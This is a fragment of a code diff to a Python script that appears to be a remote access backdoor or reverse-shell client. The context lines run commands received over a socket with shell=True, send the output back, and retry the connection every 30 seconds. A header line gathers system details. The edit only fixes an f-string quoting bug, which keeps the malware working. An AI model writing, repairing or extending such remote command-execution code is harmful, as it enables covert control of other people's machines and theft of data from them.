@@ -626,7 +626,7 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                         s.send(output)
                     except subprocess.CalledProcessError as e:
-                        send_data(f"[!] Error: {e.output.decode("utf-8", errors="ignore")}")
+                        send_data(f"[!] Error: {e.output.decode('utf-8', errors='ignore')}")
             s.close()
         except:
             time.sleep(30)
@@ -696,6 +696,7 @@ def run():
 
 if __name__ == "__main__":
     run()
+
 
 
 
